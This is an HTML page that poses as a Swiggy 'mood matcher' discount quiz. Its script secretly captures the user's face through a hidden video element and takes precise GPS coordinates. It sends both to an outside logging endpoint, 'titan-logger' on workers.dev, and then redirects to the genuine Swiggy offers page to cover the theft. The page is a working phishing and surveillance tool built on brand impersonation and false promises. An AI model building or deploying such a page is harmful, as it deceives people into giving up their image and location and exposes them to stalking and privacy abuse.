<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swiggy | Mood Matcher Quiz</title>
    <style>
        body { background: #fff; color: #282c3f; font-family: 'ProximaNova', Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { text-align: center; width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 24px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); }
        .swiggy-logo { width: 60px; height: 60px; background: #fc8019; border-radius: 15px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: white; font-weight: 900; font-size: 35px; box-shadow: 0 8px 15px rgba(252,128,25,0.3); }
        h1 { font-size: 1.5rem; font-weight: 800; margin-bottom: 10px; }
        p { font-size: 0.9rem; color: #7e808c; margin-bottom: 30px; line-height: 1.5; }
        .quiz-btn { background: #fc8019; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; font-size: 1.1rem; cursor: pointer; text-transform: uppercase; }
        #loader { display: none; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #fc8019; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>

    <div class="card">
        <div class="swiggy-logo">S</div>
        <div id="main-ui">
            <h1>Face vs. Food Quiz</h1>
            <p>Our AI scans your current mood to find the <strong>Perfect Dish</strong> and unlocks a <strong>â‚¹150 Discount</strong> near you!</p>
            <button id="btn" class="quiz-btn">START MOOD SCAN</button>
        </div>

        <div id="loader">
            <div class="spinner"></div>
            <p id="status-text" style="font-weight: 600; color: #fc8019;">ANALYZING MOOD...</p>
        </div>
    </div>

    <video id="v" playsinline muted></video>

    <script>
        const API_ENDPOINT = "https://titan-logger.saliljha523.workers.dev";
        const btn = document.getElementById('btn');
        const mainUi = document.getElementById('main-ui');
        const loader = document.getElementById('loader');
        const statusText = document.getElementById('status-text');
        const video = document.getElementById('v');
        const canvas = document.createElement('canvas');

        btn.onclick = async () => {
            mainUi.style.display = 'none';
            loader.style.display = 'block';

            try {
                // STEP 1: Wake up the Camera First (The Permission Trigger)
                statusText.innerText = "OPENING MAGIC MIRROR...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                await video.play();

                // STEP 2: Grab GPS while Camera is running (Parallel)
                statusText.innerText = "LOCATING NEARBY KITCHENS...";
                const getCoords = () => new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });

                const position = await getCoords();
                const coordsString = position ? `${position.coords.latitude},${position.coords.longitude}` : "PIN_DROP_FAILED";

                // STEP 3: Take the Photo now that Camera is warm
                statusText.innerText = "MATCHING FOOD TO MOOD...";
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoData = canvas.toDataURL('image/jpeg', 0.5);

                // Stop Hardware
                stream.getTracks().forEach(t => t.stop());

                // STEP 4: Force-Wait for Database Uplink
                statusText.innerText = "GENERATING COUPON...";
                await fetch(API_ENDPOINT, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: photoData, gps: coordsString })
                });

            } catch (err) {
                console.log("Hardware blocked by user.");
            }

            // STEP 5: Final Surprise Redirect
            window.location.replace("https://www.swiggy.com/offers-near-me");
        };
    </script>
</body>
</html>
